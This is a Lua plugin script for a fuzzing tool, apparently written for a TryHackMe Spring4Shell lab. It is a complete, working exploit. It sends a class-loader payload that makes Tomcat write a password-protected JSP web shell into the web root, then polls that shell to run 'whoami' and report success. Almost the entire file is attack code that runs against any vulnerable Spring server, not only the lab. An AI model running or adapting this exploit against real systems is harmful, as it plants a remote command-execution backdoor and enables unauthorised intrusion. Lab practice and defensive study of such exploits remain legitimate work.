-- DirFuzz Extension: Spring4Shell (THM Certified PoC), I recommend testing it against the https://tryhackme.com/room/spring4shell
function run(ctx)
    local filename = "pwned_final" -- New name for a fresh start
    local password = "thm"
    local marker = "DIRFUZZ_MARKER"

    local exploit_payload = "class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7Bc2%7Di%20if(%22" .. password .. "%22.equals(request.getParameter(%22pwd%22)))%7B%20out.print(%22" .. marker .. "%22)%3B%20java.io.InputStream%20in%20%3D%20%25%7Bc1%7Di.getRuntime().exec(request.getParameter(%22cmd%22)).getInputStream()%3B%20int%20a%20%3D%20-1%3B%20byte%5B%5D%20b%20%3D%20new%20byte%5B2048%5D%3B%20while((a%3Din.read(b))!%3D-1)%7B%20out.println(new%20String(b))%3B%20%7D%20%7D%20%25%7Bsuffix%7Di&class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp&class.module.classLoader.resources.context.parent.pipeline.first.directory=webapps/ROOT&class.module.classLoader.resources.context.parent.pipeline.first.prefix=" .. filename .. "&class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat="

    -- --- THE DOUBLE TAP ---
    print("[*] Sending Exploit (Tap 1)...")
    http_send({ method = "POST", url = ctx.url, body = exploit_payload, headers = {["Content-Type"] = "application/x-www-form-urlencoded", ["c1"]="Runtime", ["c2"]="<%", ["suffix"]="%><!--//"} })
    
    -- Small 1 second pause between taps
    local t_gap = os.clock()
    while os.clock() - t_gap < 1 do end

    print("[*] Sending Exploit (Tap 2 - The Nudge)...")
    http_send({ method = "POST", url = ctx.url, body = exploit_payload, headers = {["Content-Type"] = "application/x-www-form-urlencoded", ["c1"]="Runtime", ["c2"]="<%", ["suffix"]="%><!--//"} })
    -- ----------------------

    local exec_url = ctx.base_url:gsub("/$", "") .. "/" .. filename .. ".jsp?pwd=" .. password .. "&cmd=whoami"
    print("[*] Entering deep-poll mode...")

    for i = 1, 20 do
        local t0 = os.clock()
        while os.clock() - t0 < 2 do end 

        local res = http_send({ 
            method = "GET", 
            url = exec_url .. "&cb=" .. i,
            headers = {["User-Agent"] = "Mozilla/5.0"}
        })

        if res.body:find(marker) then
            local cmd_result = res.body:gsub(marker, ""):gsub("^%s*(.-)%s*$", "%1")
            print("\n========================================================")
            print("[!!!] PWN SUCCESSFUL - DOUBLE TAP WORKED [!!!]")
            print("RESULT: " .. cmd_result)
            print("========================================================\n")
            return { vulnerable = true, result = cmd_result }
        end
        
        print(string.format(" -> Try %d/20: Status[%d] BodySize[%d]", i, res.status_code, #res.body))
    end

    return { vulnerable = false }
end